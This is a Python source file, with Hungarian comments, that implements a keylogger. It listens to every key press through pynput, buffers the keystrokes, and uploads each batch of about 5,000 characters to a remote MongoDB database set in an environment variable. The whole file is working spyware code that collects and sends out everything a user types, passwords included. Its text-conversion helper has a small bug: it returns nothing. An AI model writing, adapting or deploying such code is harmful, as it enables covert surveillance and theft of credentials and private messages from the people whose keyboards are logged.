
from pynput.keyboard import Key, Listener

import pymongo
import datetime
import os
from dotenv import load_dotenv
load_dotenv()

"""
    Helper Functions
"""


def mongodb_update(data: list[str]) -> None:
    myClient = pymongo.MongoClient(os.getenv("DATABASE_URL"))

    myClient["users"]["users"].insert_one(
        {
            "time": datetime.datetime.now(),
            "data": convert_data_to_text(data=data)
        }
    )


def flatten(lista: set | list | tuple) -> list:

    x = []

    def flatten(elem):
        nonlocal x
        if type(elem) == list or type(elem) == tuple or type(elem) == set:
            for y in elem:
                flatten(y)
        else:

            x.append(elem)

    for item in lista:
        flatten(item)
    return x


def convert_data_to_text(data: list[list]) -> str:
    x = ""

    for row in data:
        x += "".join([str(x) for x in row])
        x += "\n"


class Recorder:
    _current_datas = [[]]

    def __init__(self, isDebug: bool = False, payload_size: int = 5_000) -> None:

        self.isDebug = isDebug
        self.payload_size = payload_size
        self.start_listener()

    def on_press(self, key: Key) -> None:

        if key == Key.shift_l:
            return
        if key == Key.space:
            key = " "

        if key == Key.backspace:

            try:
                # Ha az utolso mezo nem lenne ures
                if self._current_datas[-1] != []:
                    self._current_datas[-1].pop(-1)
                else:
                    # Ha viszont ures, akkor az utolso elottit szedi ki
                    self._current_datas[-2].pop(-1)
                    # Es az utolso mezot kitorli
                    self._current_datas.pop(-1)
            except IndexError:  # De viszont elofordulhat index hiba is
                pass

        elif key == Key.enter:
            self._current_datas.append([])
        else:
            self._current_datas[-1].append(key)

        if self.isDebug:
            print(self.get_data())

        if len(flatten(self._current_datas)) >= self.payload_size:

            self.upload_data()

    def start_listener(self) -> None:

        # Collect events until released
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def get_data(self) -> list:
        return self._current_datas

    def clear_data(self) -> None:
        self._current_datas = [[]]

    def upload_data(self) -> None:

        mongodb_update(self.get_data())
        self.clear_data()


if __name__ == "__main__":
    ex = Recorder(True)
